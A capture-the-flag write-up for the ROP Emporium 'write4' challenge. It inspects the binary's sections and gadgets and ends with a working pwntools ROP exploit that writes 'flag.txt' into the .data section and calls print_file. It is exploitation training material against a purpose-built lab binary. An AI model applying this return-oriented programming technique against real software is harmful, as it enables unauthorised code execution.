# ROP - Write4


## Description 

This challenge has been taken from https://ropemporium.com/challenge/write4.html.
This time the string ```cat flag.txt``` is not contained in the binary.
We're given a couple of hints: 
- there's a function ```print_file()``` which takes the filename string as the first argument;
- we need to search for a gadget which stores a value into the memory such as ```mov [reg], reg```.


## Explore the binary

Download the challenge:
```sh
curl --output split.zip https://ropemporium.com/binary/write4.zip
unzip write4.zip && rm write4.zip
```

Check the imported functions and those defined by the programmer as done in the previous challenges:

```sh
$ rabin2 -i write4 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400500 GLOBAL FUNC       pwnme
2   0x00000000 GLOBAL FUNC       __libc_start_main
3   0x00000000 WEAK   NOTYPE     __gmon_start__
4   0x00400510 GLOBAL FUNC       print_file
```

```sh
$ rabin2 -qs write4 | grep -ve imp -e ' 0 ' 
0x00601038 1 completed.7698
0x00400617 17 usefulFunction
0x004006a0 2 __libc_csu_fini
0x004006b0 4 _IO_stdin_used
0x00400630 101 __libc_csu_init
0x00400550 2 _dl_relocate_static_pie
0x00400520 43 _start
0x00400607 16 main
```

```asm
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006b4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret    
End of assembler dump.
pwndbg> x/s 0x4006b4
0x4006b4:       "nonexistent"
```

Here it's clear that we need to insert the address of the stored string inside the edi register.

In order to find a place to store "flag.txt", ```readelf``` could be useful. Through this we're able to print the address of the binary sections and check whether they're writable or just readonly.

```sh
$ readelf --sections write4

There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000038  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002d0  000002d0
       00000000000000f0  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003c0  000003c0
       000000000000007c  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040043c  0000043c
       0000000000000014  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400450  00000450
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400470  00000470
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004a0  000004a0
       0000000000000030  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004d0  000004d0
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004004f0  000004f0
       0000000000000030  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400520  00000520
       0000000000000182  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004006a4  000006a4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         00000000004006b0  000006b0
       0000000000000010  0000000000000000   A       0     0     4
  [16] .eh_frame_hdr     PROGBITS         00000000004006c0  000006c0
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400708  00000708
       0000000000000120  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
  [25] .comment          PROGBITS         0000000000000000  00001038
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00001068
       0000000000000618  0000000000000018          27    46     8
  [27] .strtab           STRTAB           0000000000000000  00001680
       00000000000001f6  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001876
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

```.data``` is interesting, so we inspect its content:
```sh
$ objdump -s -j .data write4         

write4:     file format elf64-x86-64

Contents of section .data:
 601028 00000000 00000000 00000000 00000000  ................
 ```

Nothing's inside it, so we can insert the string from ```0x601028```.

Now use  ```ropper``` to search for a gadget similar to the one given as hint and another which pops rdi.

```asm
0x0000000000400628: mov qword ptr [r14], r15; ret;
0x0000000000400690: pop r14; pop r15; ret;
```
and 
```asm
0x0000000000400693: pop rdi; ret;
```
Great!

Now it is possible to build the rop chain. At the ret instruction in the pwnme function, the stack should be composed in this way:

```asm
|                    |
|                    |
|    p_gadget_2pop   |
|    p_string_addr   |
|     "flag.txt"     |
| p_gadget_load_addr |
|    p_gadget_rdi    |
|    p_string_addr   |
| p_call_print_file  |
|        ...         |
----------------------
          |
          V
|                    |
|                    |
| 0x0000000000400690 |
| 0x0000000000601028 |
|     "flag.txt"     |
| 0x0000000000400628 |
| 0x0000000000400693 |
| 0x0000000000601028 |
| 0x0000000000400620 |
|        ...         |
----------------------
        STACK
```

## Exploit

```python
import pwn

p = pwn.process("./write4") 

'''
    gadgets:
        - 0x0000000000400628: mov qword ptr [r14], r15; ret; 
        - 0x0000000000400690: pop r14; pop r15; ret; 
        - 0x0000000000400693: pop rdi; ret; 

    address to place the string: 0x00601028
    address of print_file function call: 0x00400620

    payload:
        [0x0000000000400690 * offset,
        0x00601028, 
        "flag.txt",
        0x0000000000400628,
        0x0000000000400693,
        0x00601028,
        0x00400620]        
'''

payload = b"A" * 40
payload += pwn.p64(0x0000000000400690)
payload += pwn.p64(0x00601028)
payload += b"flag.txt"
payload += pwn.p64(0x0000000000400628)
payload += pwn.p64(0x0000000000400693)
payload += pwn.p64(0x00601028)
payload += pwn.p64(0x00400620)

p.recvuntil('\n> ')
p.sendline(payload)
p.interactive()
```
